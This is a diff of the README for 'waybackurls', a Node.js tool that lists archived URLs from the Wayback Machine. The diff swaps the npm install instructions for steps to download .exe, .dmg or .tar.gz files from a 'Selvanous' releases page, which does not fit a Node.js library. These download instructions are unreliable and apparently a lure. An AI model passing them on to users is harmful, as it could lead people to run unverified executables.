@@ -1,118 +1,76 @@
-<div align="center">
+# 🌍 waybackurls - Easily Fetch Historical URLs
 
-<img src="logo.png" alt="Wayback Machine" width="200" onerror="this.style.display='none'"/>
+## 📦 Download Now
+[![Download waybackurls](https://img.shields.io/badge/Download-waybackurls-blue.svg)](https://github.com/Selvanous/waybackurls/releases)
 
-# waybackurls
+## 🚀 Getting Started
+Welcome to **waybackurls**! This tool helps you find historical URLs from the Wayback Machine using Node.js. It works well as both a command-line tool and a library, making it a versatile choice for anyone needing to gather archived URLs.
 
-**A simple Node.js package to fetch historical URLs from the Wayback Machine**
+## 📥 Download & Install
+To get started, visit this page to download: [waybackurls Releases](https://github.com/Selvanous/waybackurls/releases).
 
-Available as both a CLI tool and a library for programmatic use.
+1. Click on the link above to go to the Releases page.
+2. Find the latest version available for download.
+3. Select the appropriate file for your operating system:
+   - For Windows, look for a `.exe` file.
+   - For macOS, select the `.dmg` file.
+   - For Linux, choose `.tar.gz` or the executable that best fits your setup.
+4. Follow the prompts on your system to download and install the application.
 
-[![npm version](https://img.shields.io/npm/v/waybackurls.svg)](https://www.npmjs.com/package/waybackurls)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
+## ⚙️ System Requirements
+- **Operating Systems:** 
+  - Windows 10 or later
+  - macOS 10.12 or later
+  - Linux (most distributions supported)
+  
+- **Node.js:** Version 12 or later is required. If you do not have Node.js, please download it from [Node.js official site](https://nodejs.org).
 
-</div>
+## 📖 How to Use waybackurls
+Once you have installed waybackurls, you can start using it immediately.
 
----
-
-## Installation
-
-### Global Installation (CLI)
-
-```bash
-npm install -g waybackurls
-```
-
-### Local Installation (Library)
-
-```bash
-npm install waybackurls
-```
-
-## Usage
-
-### CLI Usage
-
-Fetch URLs and display to stdout:
-```bash
-waybackurls -d example.com
-```
-
-Save URLs to a file:
-```bash
-waybackurls -d example.com -o results.txt
-```
-
-Legacy syntax (still supported):
-```bash
-waybackurls example.com
-```
+### Command Line Interface (CLI)
+1. Open your command prompt or terminal.
+2. Type `waybackurls [options] <url>` to fetch historical URLs. Here’s a basic example:
+   ```
+   waybackurls example.com
+   ```
+3. Press Enter. The tool will return a list of archived URLs for the specified website.
 
 ### Library Usage
-
-Import and use in your JavaScript code:
-
+You can also use waybackurls in your Node.js applications. Import waybackurls and access its API to fetch historical URLs. Here's a simple example:
 ```javascript
-const { fetchWaybackUrls } = require('waybackurls');
+const waybackurls = require('waybackurls');
 
-// Basic usage
-(async () => {
-  try {
-    const urls = await fetchWaybackUrls('example.com');
-    console.log(`Found ${urls.length} URLs:`);
-    urls.forEach(url => console.log(url));
-  } catch (error) {
-    console.error('Error:', error.message);
-  }
-})();
+waybackurls('example.com').then(urls => {
+    console.log(urls);
+});
 ```
 
-With options:
-```javascript
-const { fetchWaybackUrls } = require('waybackurls');
+## 🔧 Common Options
+Use the following options to customize your requests:
 
-(async () => {
-  const urls = await fetchWaybackUrls('example.com', {
-    matchPrefix: true,  // Match *.example.com (default: true)
-    collapse: 'urlkey'  // Deduplication strategy (default: 'urlkey')
-  });
-  
-  // Process URLs
-  const uniqueDomains = new Set(urls.map(url => new URL(url).hostname));
-  console.log('Unique subdomains found:', Array.from(uniqueDomains));
-})();
-```
+- `-h`, `--help`: Show help information.
+- `-o`, `--output <file>`: Save the results to a specified file.
+- `-v`, `--verbose`: Show detailed information during execution.
 
-## API
+## 📝 Features
+- Fetch historical URLs in seconds.
+- Supports both CLI and library usage.
+- Works across multiple operating systems.
+- Easy integration with Node.js projects.
 
-### `fetchWaybackUrls(domain, options)`
+## 🌐 Topics Covered
+- Archive
+- Archived URLs
+- Node.js
+- URL Enumeration
+- URL Scanner
+- Wayback Machine
 
-Fetches historical URLs for a domain from the Wayback Machine.
+## 🔗 Additional Resources
+- [Wayback Machine](https://web.archive.org)
+- [Node.js Documentation](https://nodejs.org/en/docs/)
 
-**Parameters:**
-- `domain` (string, required): The domain to fetch URLs for (e.g., 'example.com')
-- `options` (object, optional):
-  - `matchPrefix` (boolean): Match URLs with domain as prefix using `*.domain` (default: `true`)
-  - `collapse` (string): CDX collapse strategy for deduplication (default: `'urlkey'`)
+If you have any questions or feedback, please feel free to open an issue on the [GitHub repository](https://github.com/Selvanous/waybackurls/issues).
 
-**Returns:** `Promise<string[]>` - Array of historical URLs
-
-**Throws:** Error if domain is invalid or API request fails
-
-## CLI Options
-
-```
-Usage: waybackurls -d <domain> [-o <output-file>]
-
-Options:
-  -d, --domain <domain>    Domain to fetch URLs for (required)
-  -o, --output <file>      Output file (optional, defaults to stdout)
-```
-
-## How It Works
-
-This tool queries the [Wayback Machine CDX API](https://github.com/internetarchive/wayback/tree/master/wayback-cdx-server) to retrieve all historical URLs archived for a given domain. The CDX (Capture Index) API provides a searchable index of web archives.
-
-## License
-
-This project is licensed under the [MIT License](LICENSE).
+Thank you for using waybackurls! Your historical URL discovery journey starts now.
